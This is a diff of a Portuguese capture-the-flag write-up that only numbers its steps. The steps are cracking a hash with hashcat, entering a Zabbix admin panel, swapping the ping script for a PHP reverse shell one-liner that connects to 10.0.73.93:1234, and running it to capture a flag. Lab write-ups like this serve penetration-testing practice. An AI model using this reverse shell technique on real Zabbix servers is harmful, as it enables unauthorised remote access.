@@ -110,11 +110,11 @@ hashcat -m 3200 hash wordlist
 
 ### Explorando o painel de administração do Zabbix
 
-Acessando `http://reborn.hc/zabbix`.
+1 - Acessando `http://reborn.hc/zabbix`.
 
 ![Zabbix panel](/images/hackingclub-reborn/file-reborn-2025-12.png)
 
-Alterando o script ping para a reverse shell.
+2 - Alterando o script ping para a reverse shell.
 
 ```bash
 php -r '$sock=fsockopen('10.0.73.93',1234);exec('sh <&3 >&3 2>&3');'
@@ -122,11 +122,11 @@ php -r '$sock=fsockopen('10.0.73.93',1234);exec('sh <&3 >&3 2>&3');'
 
 ![Reverse shell via Zabbix](/images/hackingclub-reborn/file-reborn-2025-13.png)
 
-Clicando em **Monitoring > Hosts**, executamos o ping.
+3 - Clicando em **Monitoring > Hosts**, executamos o ping.
 
 ![Ping script](/images/hackingclub-reborn/file-reborn-2025-14.png)
 
-Capturamos a primeira flag.
+4 - Capturamos a primeira flag.
 
 ![First flag](/images/hackingclub-reborn/file-reborn-2025-15.png)
 
